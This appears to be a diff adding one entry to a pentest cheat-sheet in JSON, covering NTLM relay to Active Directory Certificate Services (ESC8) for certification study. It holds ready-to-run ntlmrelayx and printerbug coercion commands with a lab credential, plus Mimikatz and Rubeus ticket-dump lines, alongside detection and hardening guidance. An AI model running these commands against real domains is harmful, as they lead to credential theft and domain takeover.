@@ -1,0 +1,88 @@
+{
+  "id": "ptc-ntlmrelay-adcs",
+  "name": "Impacket - NTLM Relay to ADCS (ESC8)",
+  "command": "impacket-ntlmrelayx -t http://<ca_ip>/certsrv/certfnsh.asp --adcs -smb2support --template <template>",
+  "description": "ESC8 relays a coerced NTLM authentication to the ADCS web-enrollment endpoint to obtain a certificate for the victim account. Combine with a coercion trigger (printerbug) to force a Domain Controller to authenticate to the relay.",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "impacket",
+    "ntlmrelayx"
+  ],
+  "tags": [
+    "adcs",
+    "esc8",
+    "ntlm-relay",
+    "certificate"
+  ],
+  "category": "Lateral Movement",
+  "subcategory": "Pass the Certificate",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 10: Password Attacks",
+  "examples": [
+    {
+      "label": "Relay to ADCS for a cert (ESC8)",
+      "command": "impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication"
+    },
+    {
+      "label": "Trigger auth with printerbug",
+      "command": "python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:'package5shores_topher1'@10.129.234.109 10.10.16.12"
+    }
+  ],
+  "notes": "Relay coerced NTLM auth to AD CS web enrollment (ESC8) to obtain a cert for a privileged account, then PKINIT to a TGT - a classic domain-takeover chain.\nAlso covered in: OSCP PEN-200 Chapter 19 (Password Attacks)",
+  "references": [
+    {
+      "title": "HTB Academy - Password Attacks",
+      "url": "https://academy.hackthebox.com/module/details/147"
+    },
+    {
+      "title": "Certified Pre-Owned",
+      "url": "https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf"
+    },
+    {
+      "title": "printerbug",
+      "url": "https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py"
+    },
+    {
+      "title": "OffSec PEN-200",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ptc-gettgt",
+      "note": "Turn the certificate into a usable TGT.",
+      "rel": "next"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "ntlmrelayx relays a coerced NTLM authentication to the ADCS web-enrollment endpoint (ESC8) to obtain a certificate for the victim identity (e.g. a DC), then uses it via PKINIT.",
+    "prerequisites": "ADCS web enrollment over HTTP (no EPA), a coercion vector, and a relay host.",
+    "impact": "A certificate for a privileged identity (often a DC) enabling PKINIT auth and DCSync - domain compromise.",
+    "detection": "[MITRE T1649] Certificate-based Kerberos auth (PKINIT): 4768 with a certificate; on the CA, 4886/4887 certificate requests where the SAN != requester; abnormal certificate issuance; ntlmrelay to ADCS shows a relayed request from a non-DC IP. On the CA, a DomainController-template request sourced from the relay IP rather than the DC.",
+    "artifacts": "A relayed cert request (4886/4887 from the relay IP); the issued cert; coercion + relay traffic.",
+    "prevention": "Enforce HTTPS + Extended Protection for Authentication on ADCS web enrollment; disable it if unused; block coercion (patch/disable Spooler); Harden ADCS templates (remove ENROLLEE_SUPPLIES_SUBJECT, require manager approval, restrict enrollment); enforce HTTPS + Extended Protection on web enrollment (ESC8); monitor 4886/4887 and PKINIT logons; restrict who can enroll.",
+    "evasion": "The certificate persists for years and is usable offline from any host, decoupling exploitation from the noisy relay step.",
+    "sources": [
+      "HTB M10",
+      "MITRE T1649"
+    ],
+    "misconfiguration": "Pass-the-Certificate (PtC) attacks exploit ADCS certificate abuse (ESC1/ESC8) combined with Kerberos PKINIT. Shadow credentials (pywhisker) exploit write access to msDS-KeyCredentialLink to add a certificate-based authentication mechanism to any account. Pass-the-Ticket works because Kerberos tickets are extractable from LSASS memory.",
+    "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
+    "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
+  }
+}
